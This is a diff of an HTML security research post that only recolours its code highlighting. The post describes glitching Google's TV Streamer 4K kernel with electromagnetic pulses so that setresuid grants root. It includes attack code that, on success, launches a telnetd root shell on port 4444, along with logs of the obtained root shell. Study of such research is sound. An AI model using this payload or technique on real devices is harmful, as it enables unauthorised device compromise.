@@ -518,16 +518,16 @@
 <p>With a reliable, characterized corruption primitive in hand, we can swap the test code for the real attack.</p>
 <h3 id="glitching-setresuid">Glitching setresuid</h3>
 <p>The <code>setresuid</code> syscall sets the real, effective, and saved UIDs of the calling process. In the Linux kernel:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">long</span> <span style="color:#a6e22e">__sys_setresuid</span>(<span style="color:#66d9ef">uid_t</span> ruid, <span style="color:#66d9ef">uid_t</span> euid, <span style="color:#66d9ef">uid_t</span> suid) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">long</span> <span style="color:#50fa7b">__sys_setresuid</span>(<span style="color:#8be9fd">uid_t</span> ruid, <span style="color:#8be9fd">uid_t</span> euid, <span style="color:#8be9fd">uid_t</span> suid) {
 </span></span><span style="display:flex;"><span>    ...
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((...) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">ns_capable_setid</span>(old<span style="color:#f92672">-&gt;</span>user_ns, CAP_SETUID))   <span style="color:#75715e">// capability check
-</span></span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EPERM;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ((...) <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#ff79c6">!</span><span style="color:#50fa7b">ns_capable_setid</span>(old<span style="color:#ff79c6">-&gt;</span>user_ns, CAP_SETUID))   <span style="color:#6272a4">// capability check
+</span></span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">-</span>EPERM;
 </span></span><span style="display:flex;"><span>    ...
-</span></span><span style="display:flex;"><span>    retval <span style="color:#f92672">=</span> <span style="color:#a6e22e">security_task_fix_setuid</span>(new, old, LSM_SETID_RES); <span style="color:#75715e">// LSM hook
-</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (retval <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> error;
+</span></span><span style="display:flex;"><span>    retval <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">security_task_fix_setuid</span>(new, old, LSM_SETID_RES); <span style="color:#6272a4">// LSM hook
+</span></span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (retval <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">goto</span> error;
 </span></span><span style="display:flex;"><span>    ...
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">commit_creds</span>(new);                                   <span style="color:#75715e">// commit new creds
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#50fa7b">commit_creds</span>(new);                                   <span style="color:#6272a4">// commit new creds
 </span></span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>There are two checks between us (uid = 2000) and <code>commit_creds(new)</code> with <code>new-&gt;uid = 0</code>:</p>
 <ul>
@@ -537,21 +537,21 @@
 <p>Only the <code>commoncap</code> LSM is in play (i.e., <code>CONFIG_SECURITY_SAFESETID</code> is not set). We are mostly interested in bypassing the <code>ns_capable_setid()</code> check.</p>
 <h3 id="attack-code">Attack code</h3>
 <p>The attacking code is as small as we could make it.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">asm</span> <span style="color:#66d9ef">volatile</span>(
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;mov r0, #0;&#34;</span>       <span style="color:#75715e">// ruid
-</span></span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;mov r1, #0;&#34;</span>       <span style="color:#75715e">// euid
-</span></span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;mov r2, #0;&#34;</span>       <span style="color:#75715e">// suid
-</span></span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;mov r7, #208;&#34;</span>     <span style="color:#75715e">// __NR_setresuid32
-</span></span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;swi #0;&#34;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;mov %[ret], r0;&#34;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">:</span> [ret] <span style="color:#e6db74">&#34;=r&#34;</span> (ret) <span style="color:#f92672">:</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;r0&#34;</span>, <span style="color:#e6db74">&#34;r1&#34;</span>, <span style="color:#e6db74">&#34;r2&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">while</span> (<span style="color:#bd93f9">1</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">asm</span> <span style="color:#ff79c6">volatile</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r0, #0;&#34;</span>       <span style="color:#6272a4">// ruid
+</span></span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r1, #0;&#34;</span>       <span style="color:#6272a4">// euid
+</span></span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r2, #0;&#34;</span>       <span style="color:#6272a4">// suid
+</span></span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r7, #208;&#34;</span>     <span style="color:#6272a4">// __NR_setresuid32
+</span></span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;swi #0;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov %[ret], r0;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">:</span> [ret] <span style="color:#f1fa8c">&#34;=r&#34;</span> (ret) <span style="color:#ff79c6">:</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;r0&#34;</span>, <span style="color:#f1fa8c">&#34;r1&#34;</span>, <span style="color:#f1fa8c">&#34;r2&#34;</span>
 </span></span><span style="display:flex;"><span>    );
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;touch /data/local/tmp/setresuid/success.txt&#34;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/data/local/tmp/setresuid/telnetd-static -p 4444 -l /bin/sh&#34;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (ret <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">system</span>(<span style="color:#f1fa8c">&#34;touch /data/local/tmp/setresuid/success.txt&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">system</span>(<span style="color:#f1fa8c">&#34;/data/local/tmp/setresuid/telnetd-static -p 4444 -l /bin/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>It loops on <code>setresuid(0, 0, 0)</code>. On success (i.e., <code>ret == 0</code>), it drops a file the host can poll for via adb, then launches a static <code>telnetd</code> on port 4444 with <code>/bin/sh</code>. <strong>No trigger, no direct response</strong>, same idea as the characterization code, just with a much more interesting &ldquo;success&rdquo; condition.</p>
@@ -564,59 +564,59 @@
 </p>
 <p style="text-align:center; color:#666; font-size:0.9em;"><em>The attack loop; on a successful glitch we keep <code>telnetd</code> running and stop glitching</em></p>
 <p>We sweep the glitch amplitude inside the band that characterization said was productive:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># attack loop</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4"># attack loop</span>
 </span></span><span style="display:flex;"><span>move_probe(location)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
-</span></span><span style="display:flex;"><span>    glitch_power <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">90</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">while</span> <span style="color:#ff79c6">True</span>:
+</span></span><span style="display:flex;"><span>    glitch_power <span style="color:#ff79c6">=</span> random<span style="color:#ff79c6">.</span>randint(<span style="color:#bd93f9">50</span>, <span style="color:#bd93f9">90</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">...</span>
 </span></span></code></pre></div><p>No trigger, no delay. We are injecting random glitches constantly, and waiting.</p>
 <h3 id="successful-attack">Successful attack</h3>
 <p>Eventually, a glitch lands. The host loop sees the new sentinel file:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>...
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>...
 </span></span><span style="display:flex;"><span>110 0 55 G b&#39;root\nstart.sh\ntelnetd-static\n&#39; 46
 </span></span><span style="display:flex;"><span>111 0 21 G b&#39;root\nstart.sh\ntelnetd-static\n&#39; 46
 </span></span><span style="display:flex;"><span>112 0 40 G b&#39;root\nstart.sh\ntelnetd-static\n&#39; 46
 </span></span><span style="display:flex;"><span>113 0 58 R b&#39;root\nstart.sh\nsuccess.txt\ntelnetd-static&#39;
 </span></span><span style="display:flex;"><span>SUCCESS: try to connect to host:4444
 </span></span></code></pre></div><p>And we telnet in:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ telnet 10.0.0.119 <span style="color:#ae81ff">4444</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ telnet 10.0.0.119 <span style="color:#bd93f9">4444</span>
 </span></span><span style="display:flex;"><span>Trying 10.0.0.119...
 </span></span><span style="display:flex;"><span>Connected to 10.0.0.119.
-</span></span><span style="display:flex;"><span>Escape character is <span style="color:#e6db74">&#39;^]&#39;</span>.
-</span></span><span style="display:flex;"><span>kirkwood:/ <span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>Escape character is <span style="color:#f1fa8c">&#39;^]&#39;</span>.
+</span></span><span style="display:flex;"><span>kirkwood:/ <span style="color:#6272a4">#</span>
 </span></span></code></pre></div><p>Root:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kirkwood:/ <span style="color:#75715e"># whoami</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kirkwood:/ <span style="color:#6272a4"># whoami</span>
 </span></span><span style="display:flex;"><span>root
 </span></span></code></pre></div><p>Job done. One EM pulse, one corrupted branch inside <code>__sys_setresuid</code>, one credential commit later, we are uid 0 on Google&rsquo;s TV Streamer 4K.</p>
 <h3 id="limitations">Limitations</h3>
 <p>But we are <em>not</em> free. SELinux is still on, still enforcing, and our domain has not moved:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kirkwood:/ <span style="color:#75715e"># id -Z</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kirkwood:/ <span style="color:#6272a4"># id -Z</span>
 </span></span><span style="display:flex;"><span>u:r:shell:s0
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>kirkwood:/ <span style="color:#75715e"># xxd /dev/block/by-name/boot_a</span>
+</span></span><span style="display:flex;"><span>kirkwood:/ <span style="color:#6272a4"># xxd /dev/block/by-name/boot_a</span>
 </span></span><span style="display:flex;"><span>xxd: /dev/block/by-name/boot_a: Permission denied
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>kirkwood:/ <span style="color:#75715e"># logcat -d | grep avc</span>
-</span></span><span style="display:flex;"><span>09-09 05:21:47.836 <span style="color:#ae81ff">3922</span> W xxd : type<span style="color:#f92672">=</span><span style="color:#ae81ff">1400</span> audit<span style="color:#f92672">(</span>0.0:45<span style="color:#f92672">)</span>: avc:  denied
-</span></span><span style="display:flex;"><span>scontext<span style="color:#f92672">=</span>u:r:shell:s0 tcontext<span style="color:#f92672">=</span>u:object_r:kernel:s0 permissive<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>kirkwood:/ <span style="color:#6272a4"># logcat -d | grep avc</span>
+</span></span><span style="display:flex;"><span>09-09 05:21:47.836 <span style="color:#bd93f9">3922</span> W xxd : <span style="color:#8be9fd;font-style:italic">type</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1400</span> audit<span style="color:#ff79c6">(</span>0.0:45<span style="color:#ff79c6">)</span>: avc:  denied
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">scontext</span><span style="color:#ff79c6">=</span>u:r:shell:s0 <span style="color:#8be9fd;font-style:italic">tcontext</span><span style="color:#ff79c6">=</span>u:object_r:kernel:s0 <span style="color:#8be9fd;font-style:italic">permissive</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>
 </span></span></code></pre></div><p>We&rsquo;re <code>uid 0</code>, but we&rsquo;re still pinned to the <code>shell</code> SELinux context. Many of the most interesting reads, including flash partitions, kernel memory, anything in the kernel object class, remain remains inaccessible. To turn this <code>root</code> into a <strong>full device compromise</strong>, we would have to exploit another software or hardware vulnerability, in order to bypass SELinux. That&rsquo;s research for another session.</p>
 <!--
     Bonus
 -->
 <h2 id="bonus-syslog-dump">Bonus: syslog dump</h2>
 <p>While we were here, we tried the same trick on another tempting in-kernel check: <code>check_syslog_permissions</code> inside <code>do_syslog</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">do_syslog</span>(<span style="color:#66d9ef">int</span> type, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">int</span> len, <span style="color:#66d9ef">int</span> src) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">do_syslog</span>(<span style="color:#8be9fd">int</span> type, <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>buf, <span style="color:#8be9fd">int</span> len, <span style="color:#8be9fd">int</span> src) {
 </span></span><span style="display:flex;"><span>    ...
-</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> <span style="color:#a6e22e">check_syslog_permissions</span>(type, source);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (error)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> error;
+</span></span><span style="display:flex;"><span>    error <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">check_syslog_permissions</span>(type, source);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (error)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> error;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> (type) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">switch</span> (type) {
 </span></span><span style="display:flex;"><span>        ...
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> SYSLOG_ACTION_READ_ALL:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">case</span> <span style="color:#8be9fd;font-style:italic">SYSLOG_ACTION_READ_ALL</span>:
 </span></span><span style="display:flex;"><span>            ...
-</span></span><span style="display:flex;"><span>            error <span style="color:#f92672">=</span> <span style="color:#a6e22e">syslog_print_all</span>(buf, len, clear);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            error <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">syslog_print_all</span>(buf, len, clear);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">break</span>;
 </span></span><span style="display:flex;"><span>        ...
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
